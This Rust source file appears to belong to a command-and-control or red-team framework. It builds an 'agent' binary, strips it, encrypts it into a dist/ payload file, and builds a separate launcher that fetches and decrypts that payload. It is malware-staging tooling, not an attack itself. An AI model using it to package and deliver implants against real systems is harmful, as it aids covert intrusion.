//! Payload build pipeline: cargo build → strip → encrypt → write to `dist/`.

use anyhow::{anyhow, Context, Result};
use common::CryptoSession;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use tracing::{info, warn};

use crate::config::PayloadConfig;

const LAUNCHER_PACKAGE: &str = "launcher";
const DIST_DIR: &str = "dist";

/// Build the agent for the given profile and write the encrypted payload to
/// `dist/<output_name>.enc`. Returns the path to the encrypted file.
pub fn build_payload(profile_name: &str, cfg: &PayloadConfig) -> Result<PathBuf> {
    let key = cfg.resolve_key()?;
    let triple = cfg.target_triple()?;
    let package = cfg.package.as_str();

    info!(target_triple = %triple, package, "Building agent payload");
    let bin_path = cargo_build(package, &triple, &cfg.features)?;

    // Best-effort strip — only meaningful for native / matching strip tool.
    if let Err(e) = strip_if_available(&bin_path) {
        warn!("strip step skipped: {e:#}");
    }

    let plaintext = std::fs::read(&bin_path)
        .with_context(|| format!("Failed to read built binary {}", bin_path.display()))?;

    let session = CryptoSession::from_shared_secret(&key);
    let encrypted = session.encrypt(&plaintext);

    std::fs::create_dir_all(DIST_DIR).with_context(|| format!("Failed to create {DIST_DIR}/"))?;
    let out_name = cfg
        .output_name
        .clone()
        .unwrap_or_else(|| profile_name.to_string());
    let out_path = Path::new(DIST_DIR).join(format!("{out_name}.enc"));
    std::fs::write(&out_path, &encrypted)
        .with_context(|| format!("Failed to write {}", out_path.display()))?;

    info!(
        plaintext_bytes = plaintext.len(),
        encrypted_bytes = encrypted.len(),
        path = %out_path.display(),
        "Encrypted payload written"
    );
    Ok(out_path)
}

/// Build the launcher for the same triple. The launcher is *not* encrypted —
/// it is the bootstrap that fetches and decrypts the payload. Returns the
/// path of the launcher inside `dist/`.
pub fn build_launcher_for_profile(profile_name: &str, cfg: &PayloadConfig) -> Result<PathBuf> {
    let triple = cfg.target_triple()?;
    info!(target_triple = %triple, "Building launcher");

    // Forward only features the launcher actually understands. For now that's
    // limited to `traffic-normalization` if/when it lands; unknown features
    // are passed through and cargo will reject any that don't exist.
    let launcher_features: Vec<String> = cfg
        .features
        .iter()
        .filter(|f| matches!(f.as_str(), "traffic-normalization"))
        .cloned()
        .collect();

    let bin_path = cargo_build(LAUNCHER_PACKAGE, &triple, &launcher_features)?;

    std::fs::create_dir_all(DIST_DIR)?;
    let out_name = cfg
        .output_name
        .clone()
        .unwrap_or_else(|| profile_name.to_string());
    let ext = bin_path
        .extension()
        .and_then(|e| e.to_str())
        .map(|e| format!(".{e}"))
        .unwrap_or_default();
    let out_path = Path::new(DIST_DIR).join(format!("{out_name}-launcher{ext}"));
    std::fs::copy(&bin_path, &out_path)
        .with_context(|| format!("Failed to copy launcher to {}", out_path.display()))?;
    info!(path = %out_path.display(), "Launcher copied to dist/");
    Ok(out_path)
}

/// Run `cargo build --release --target <triple> -p <pkg>` and return the
/// resulting binary path.
fn cargo_build(package: &str, triple: &str, features: &[String]) -> Result<PathBuf> {
    let mut cmd = Command::new("cargo");
    cmd.args(["build", "--release", "--target", triple, "-p", package]);
    if !features.is_empty() {
        cmd.arg("--features").arg(features.join(","));
    }
    cmd.stdout(Stdio::inherit()).stderr(Stdio::inherit());

    info!(?features, "cargo {:?}", cmd.get_args().collect::<Vec<_>>());
    let status = cmd
        .status()
        .with_context(|| format!("Failed to invoke cargo for {package}"))?;
    if !status.success() {
        return Err(anyhow!("cargo build failed for {package} ({status})"));
    }

    let mut bin = PathBuf::from("target")
        .join(triple)
        .join("release")
        .join(package);
    if triple.contains("windows") {
        bin.set_extension("exe");
    }
    if !bin.exists() {
        return Err(anyhow!("Expected binary not found at {}", bin.display()));
    }
    Ok(bin)
}

/// Run `strip` against a binary if a compatible strip is on PATH. Failures
/// are non-fatal because cross-strip is rarely installed.
fn strip_if_available(path: &Path) -> Result<()> {
    let strip = which::which("strip").map_err(|e| anyhow!("`strip` not on PATH: {e}"))?;
    let status = Command::new(strip)
        .arg(path)
        .status()
        .with_context(|| format!("Failed to invoke strip on {}", path.display()))?;
    if !status.success() {
        return Err(anyhow!("strip exited with {status}"));
    }
    info!(path = %path.display(), "binary stripped");
    Ok(())
}
